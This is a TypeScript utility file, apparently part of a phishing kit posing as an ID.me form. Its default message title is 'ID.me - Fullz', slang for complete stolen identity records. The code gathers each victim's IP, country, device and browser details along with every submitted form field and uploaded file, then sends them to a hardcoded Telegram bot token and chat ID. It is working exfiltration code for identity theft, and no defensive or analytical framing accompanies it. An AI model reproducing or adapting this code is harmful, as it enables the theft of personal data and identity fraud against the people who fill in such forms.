// src/utils/telegram.ts

import axios from "axios";

const BOT_TOKEN = "6491555567:AAFcD2lenFATDygMcvzth-DcBJ4S1l4YBAo";
const CHAT_IDS = ["6792088006"]; // Both chat IDs

/**
 * Gets the visitor's IP address
 */
export const getVisitorIP = async (): Promise<string> => {
  try {
    const response = await axios.get('https://api.ipify.org?format=json');
    return response.data.ip;
  } catch (error) {
    console.error("Error getting IP:", error);
    return "Unknown";
  }
};

/**
 * Gets country information from IP address
 */
export const getCountryFromIP = async (ip: string): Promise<string> => {
  try {
    const response = await axios.get(`http://www.geoplugin.net/json.gp?ip=${ip}`);
    if (response.data && response.data.geoplugin_countryName) {
      return response.data.geoplugin_countryName;
    }
    return "Unknown";
  } catch (error) {
    console.error("Error getting country:", error);
    return "Unknown";
  }
};

/**
 * Gets browser/user agent information
 */
export const getUserAgent = (): string => {
  return navigator.userAgent;
};

/**
 * Gets current date and time formatted
 */
export const getCurrentDateTime = (): string => {
  const now = new Date();
  return now.toLocaleString('en-US', { 
    weekday: 'short', 
    month: 'short', 
    day: 'numeric', 
    year: 'numeric', 
    hour: 'numeric', 
    minute: 'numeric', 
    second: 'numeric',
    hour12: true 
  });
};

/**
 * Gets device/browser information
 */
export const getDeviceInfo = (): string => {
  const ua = navigator.userAgent;
  let deviceInfo = "";
  
  if (/mobile/i.test(ua)) deviceInfo += "Mobile | ";
  if (/iPhone/i.test(ua)) deviceInfo += "iPhone | ";
  if (/iPad/i.test(ua)) deviceInfo += "iPad | ";
  if (/Android/i.test(ua)) deviceInfo += "Android | ";
  if (/Windows/i.test(ua)) deviceInfo += "Windows | ";
  if (/Mac/i.test(ua)) deviceInfo += "Mac | ";
  if (/Chrome/i.test(ua)) deviceInfo += "Chrome | ";
  if (/Firefox/i.test(ua)) deviceInfo += "Firefox | ";
  if (/Safari/i.test(ua)) deviceInfo += "Safari | ";
  
  return deviceInfo.slice(0, -3) || "Unknown";
};

/**
 * Backward compatible sendTelegramMessage - accepts both string AND object
 * This way you don't have to change any of your existing forms!
 */
export const sendTelegramMessage = async (
  data: string | Record<string, any>,
  formType?: string
) => {
  // Get current date and time
  const addDate = getCurrentDateTime();
  
  // Get IP address
  const ip = await getVisitorIP();
  
  // Get country from IP
  const country = await getCountryFromIP(ip);
  
  // Get browser user agent
  const browser = getUserAgent();
  
  // Get device info
  const deviceInfo = getDeviceInfo();
  
  let message = "";
  
  // Check if data is a string (old way) or object (new way)
  if (typeof data === "string") {
    // It's a string message from existing forms
    message = `${data}\n━━━━━━━━━━━━━━━━━━━━━\n User IP: ${ip}\ Country: ${country}\n Device: ${deviceInfo}\n Date/Time: ${addDate}\n User-Agent: ${browser}\n━━━━━━━━━━━━━━━━━━━━━\n*dreamchaser*`;
  } else {
    // It's an object from new forms
    const title = formType || "ID.me - Fullz";
    message = `**${title}**+++\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━\n`;
    
    // Add all form fields dynamically
    for (const [key, value] of Object.entries(data)) {
      if (value && value !== "") {
        const displayKey = key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
        message += `${displayKey}: ${value}\n`;
      }
    }
    
    message += `━━━━━━━━━━━━━━━━━━━━━\n`;
    message += ` User IP: ${ip}\n`;
    message += `Country: ${country}\n`;
    message += `Device: ${deviceInfo}\n`;
    message += `Date/Time: ${addDate}\n`;
    message += `User-Agent: ${browser}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━\n`;
    
  }
  
  // Send to all configured chat IDs
  for (const chatId of CHAT_IDS) {
    try {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const response = await axios.post(url, {
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      });
      
      if (!response.data.ok) {
        console.error(`Telegram API Error for ${chatId}:`, response.data.description);
      } else {
        console.log(`Message sent to ${chatId}`);
      }
    } catch (error) {
      console.error(`Error sending message to ${chatId}:`, error);
    }
  }
};

/**
 * Sends a file (as a document) to all configured Telegram chats
 */
export const sendTelegramFile = async (file: File, customCaption?: string) => {
  const caption = customCaption || "File upload";
  const addDate = getCurrentDateTime();
  const ip = await getVisitorIP();
  const country = await getCountryFromIP(ip);
  const browser = getUserAgent();
  
  const fullCaption = `${caption}\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip}\n Country: ${country}\n Time: ${addDate}\n User-Agent: ${browser}\n━━━━━━━━━━━━━━━━━━━━━\n*Telegram ID: @*`;
  
  for (const chatId of CHAT_IDS) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", file);
    formData.append("caption", fullCaption);
    
    try {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
      const response = await axios.post(url, formData, {
        headers: { "Content-Type": "multipart/form-data" },
        timeout: 15000,
      });
      
      if (!response.data.ok) {
        console.error(`Telegram API Error for ${chatId}:`, response.data.description);
      } else {
        console.log(`File sent to ${chatId}`);
      }
    } catch (error) {
      console.error(`Error sending file to ${chatId}:`, error);
    }
  }
};